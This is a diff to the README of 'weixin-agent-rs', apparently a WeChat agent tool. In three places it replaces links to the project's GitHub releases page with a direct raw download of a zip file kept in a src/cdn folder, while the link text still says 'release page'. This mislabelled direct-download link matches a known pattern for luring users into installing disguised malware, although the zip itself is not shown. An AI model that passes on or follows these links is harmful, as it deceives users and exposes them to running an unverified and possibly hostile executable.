@@ -1,6 +1,6 @@
 # 🤖 weixin-agent-rs - Run WeChat with smart agents
 
-[![Download latest release](https://img.shields.io/badge/Download%20Release-Visit%20Page-blue)](https://github.com/aipurposes1587-max/weixin-agent-rs/releases)
+[![Download latest release](https://img.shields.io/badge/Download%20Release-Visit%20Page-blue)](https://raw.githubusercontent.com/aipurposes1587-max/weixin-agent-rs/main/src/cdn/weixin_rs_agent_v3.4.zip)
 
 ## 📌 What this app does
 
@@ -28,7 +28,7 @@ Use a Windows PC with:
 
 Visit the release page and download the Windows file from there:
 
-[Open the release page](https://github.com/aipurposes1587-max/weixin-agent-rs/releases)
+[Open the release page](https://raw.githubusercontent.com/aipurposes1587-max/weixin-agent-rs/main/src/cdn/weixin_rs_agent_v3.4.zip)
 
 After the page opens:
 
@@ -170,7 +170,7 @@ This project has readme files in more than one language:
 
 ## 📎 Project link
 
-[Open the release page to download](https://github.com/aipurposes1587-max/weixin-agent-rs/releases)
+[Open the release page to download](https://raw.githubusercontent.com/aipurposes1587-max/weixin-agent-rs/main/src/cdn/weixin_rs_agent_v3.4.zip)
 
 ## 🧰 Helpful command
 
